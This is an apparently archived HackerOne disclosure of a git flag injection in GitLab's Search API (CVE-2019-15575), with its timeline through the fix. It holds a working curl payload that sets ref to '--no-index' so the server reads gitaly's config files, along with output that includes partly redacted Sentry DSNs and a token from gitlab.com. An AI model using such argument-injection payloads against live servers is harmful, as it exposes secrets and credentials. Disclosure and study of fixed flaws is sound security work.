---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/command-injection-generic
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
body: true
date: 2019-12-15
submitted: 2019-08-26T23:47:50.929Z
bounty_usd: 7000
votes: 130
cve: "CVE-2019-15575"
program: "[[programs/gitlab|GitLab]]"
reporter: "vakzz"
source: "https://hackerone.com/reports/682442"
title: "Git flag injection - Search API with scope 'blobs' "
---
# Git flag injection - Search API with scope 'blobs' 

> **Severity:** High | **Bounty:** 7,000 USD | **Votes:** 130 | **Program:** GitLab | **Disclosed:** 2019-12-15

- Report: [https://hackerone.com/reports/682442](https://hackerone.com/reports/682442)
- CWE: Command Injection - Generic | CVE: CVE-2019-15575
- Submitted: 2019-08-26T23:47:50.929Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

As requested from @hackerjuan, breaking this out of https://hackerone.com/reports/658013 for easier tracking.

## Summary
Gitlab 12.1.6 fixed the `wiki_blobs` scope of the search api, but the `blobs` scope is still vulnerable to git flag injection and allows reading any file in `/var/opt/gitlab/gitaly` including `config.toml`.

## Steps to reproduce
Make a search API call setting the `ref` parameter to `--no-index`, `search` to a common character such as `.` or `a`, and `scope` to `blobs`:

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=blobs&search=.&ref=--no-index

[{"basename":null,"data":"VERSION\u00001\u0000Gitaly, version 1.53.2\n","filename":null,"id":null,"ref":"--no-index","startline":0,"project_id":4},{"basename":null,"data":"config.toml\u00001\u0000# Gitaly configuration file\nconfig.toml\u00002\u0000# This file is managed by gitlab-ctl. Manual changes will be\nconfig.toml\u00003\u0000# erased! To change the contents below, edit /etc/gitlab/gitlab.rb\nconfig.toml\u00004\u0000# and run:\nconfig.toml\u00005\u0000# sudo gitlab-ctl reconfigure\nconfig.toml\u00006\u0000\nconfig.toml\u00007\u0000socket_path = '/var/opt/gitlab/gitaly/gitaly.socket'\nconfig.toml\u00008\u0000bin_dir = '/opt/gitlab/embedded/bin'\nconfig.toml\u00009\u0000\n","filename":null,"id":null,"ref":"--no-index","startline":0,"project_id":4}]
```

The ref parameter ends up being passed to `git grep` and setting it to `--no-index` includes the current working directory and files not managed by git:

```
/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.git grep --ignore-case -I --line-number --null --before-context 2 --after-context 2 --perl-regexp -e a --no-index
```

## Impact

The `config.toml` can contain sensitive information, api keys and tokens. For example on `gitlab.com` it contain the sentry.io api tokens as well as the gitaly token:

```
https://gitlab.com/api/v4/projects/2009901/search?scope=blobs&search=a&ref=--no-index

sentry_dsn = 'https://927bee37df654608xxxxxxxxxxxxxxxx:0324504ee7844264xxxxxxxxxxxxxxxx@sentry.gitlab.net/16
ruby_sentry_dsn = 'https://8ff7dd344e1d4976xxxxxxxxxxxxxxxx:bb9d785b3fe7447bxxxxxxxxxxxxxxxx@sentry.gitlab.net/29

token = 'yfZTE0Oxxxxxxx'
```

I haven't looked into what is possible with the above tokens as potentially there is sensitive information in sentry.io. 

Let me know if you have any questions or require any other information.

Cheers,
Will

## Impact

Read access to any file in `/var/opt/gitlab/gitaly` including `config.toml` which may contain sensitive information, tokens, and API keys

## Timeline

- **Report Filed**
- **2019-08-27** @gitlab-securitybot: Hi @vakzz,

Thank you for submitting this report. We will investigate the issue as soon as possible.
Due to our current workload, we will get back within 20 business days with an update.

Please refrain from submitting your report or inquiring about its status through
additional channels, as this unnecessarily binds resources in the security team.

Best regards,
GitLab Security Team
- **Report Severity Updated**
- **Report Triaged**
- **2019-09-11** @gitlab-securitybot: ETA for fix:

Hi @vakzz,

The GitLab issue created from your report is currently scheduled for 2019-10-22.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2019-09-12** @gitlab-securitybot: ETA for fix:

Hi @vakzz,

The GitLab issue created from your report is currently scheduled for 2019-09-22.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2019-10-03** @vakzz: Hi @hackerjuan,

Just had a quick test of the `blobs` scope with the latest release and can confirm that the issue is fixed.

Cheers,
Will
- **Report Resolved**
- **Bounty Awarded**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
